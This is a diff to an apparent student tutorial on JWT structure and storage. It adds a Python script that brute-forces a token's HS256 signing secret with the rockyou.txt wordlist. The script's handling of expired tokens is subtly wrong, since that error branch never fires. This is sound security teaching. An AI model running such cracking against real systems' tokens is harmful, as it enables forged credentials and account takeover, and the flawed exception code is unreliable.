@@ -158,7 +158,7 @@ JSON Web Token (JWT) is an open standard utilized to generate and use bearer tok
 - Payload
 - Signature
 
-Therefore, a JWT typically looks like the following: xxxxx.yyyyy.zzzzz
+Therefore, a JWT typically looks like the following: `xxxxx.yyyyy.zzzzz`
 
 The header is Base64Url encoded and contains the type of token and the hashing algorithms used, typically HMAC SHA256 or RSA. The payload contains the claims, which are statements about the entity, typically a user, and any additional data.
 
@@ -172,3 +172,26 @@ One example of a web application using JWT authentication can be found:
 Now, the client application can obtain an access token to access protected resources in subsequent HTTP requests. Once the client application receives the access token (JWT token) from the server, the token can be persisted into the local storage of client applications.
 
 To view the token right-click and go to Inspect Element. A window will appear at the bottom of the page. Select the Storage tab, then expand Local Storage. Whenever HTTP requests are sent to access the protected resources of the API server, the tokens stored in the Local Storage are checked.
+# Brute Force the secret
+
+The server may be using a weak secret key for the hashing algorithm. Therefore, a potential hacker can easily brute force the secret key.
+
+Create and open a new file named `weak-secret.py`.
+
+The first thing the student must do is import the jwt object, which is part of the PyJWT package.
+```python
+import jwt
+encoded = input("Enter encoded payload: ")
+
+with open('rockyou.txt') as secrets:
+    for secret in secrets:
+        try:
+            payload = jwt.decode(encoded, secret.rstrip(), algorithms=['HS256'])
+            print('Success! Token decoded with ....[' + secret.rstrip() + ']')
+            break
+        except jwt.InvalidTokenError:
+            print('Invalid Token .... [' + secret.rstrip() + ']')
+        except jwt.ExpiredSignatureError:
+            print('Token Expired ....[' + secret.rstrip() + ']')
+```
+
